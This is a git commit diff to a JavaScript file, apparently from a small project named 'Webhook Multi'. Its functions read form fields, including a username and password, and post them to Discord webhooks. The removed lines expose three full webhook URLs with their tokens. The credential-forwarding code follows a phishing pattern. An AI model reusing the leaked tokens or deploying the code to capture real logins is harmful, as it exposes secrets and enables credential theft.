5632945ff9bef441cb1982cabd0a14c567299749
Sandeep_1904 <81603800+Sandeep-1904@users.noreply.github.com>
2025-01-17 21:19:24 +0530

    script.js

--- Webhook Multi/script.js
+++ Webhook Multi/script.js
@@ -3,7 +3,7 @@ function Password() {
     let username = document.getElementById("Username").value;
     let password = document.getElementById("Password").value;
 
-    const webhook = "https://discord.com/api/webhooks/1329461910554415249/NPew0IgAfTITm-6xo5pYsD0XmFY_P4zOTXlW7Oc1MTjTLfX6V3_Fs4aDS9j6MGc-S8Aw";
+    const webhook = "Your Webhook";
     
     const contents = `Message From WebHook Multi:\nLogin Details\nUsername: ${username}\nPassword: ${password}\n `;
 
@@ -31,7 +31,7 @@ function TextMessage() {
     let messageFrom = document.getElementById("MessageFrom").value;
     let textMessage = document.getElementById("TextMessage").value;
 
-    const webhook = "https://discord.com/api/webhooks/1329815993597558894/dzxlVZNubLLC1DkLRfS1ZRLVyFDiWYEEzF9QoydnGyn6Lu6URBBoJETHtJfZRNM6ghyp";
+    const webhook = "Your Webhook";
     
     const contents = `Message From WebHook Multi:\nMessages Sent\nMessage From: ${messageFrom}\nTextMessage: ${textMessage}\n `;
 
@@ -58,7 +58,7 @@ function PhoneNumber() {
     let Mail = document.getElementById("Mail").value;
     let PhoneNumber = document.getElementById("PhoneNumber").value;
 
-    const webhook = "https://discord.com/api/webhooks/1329826936695820501/4LevMas0mxVtKNzHyxCyCRk9UpArqhY9X97gt5sctaIGP8Z5maVh8m87hJvH62TcRv8m";
+    const webhook = "Your Webhook";
     
     const contents = `Message From WebHook Multi:\nContact Details\nMail: ${Mail}\nPhoneNumber: ${PhoneNumber}\n`;
 
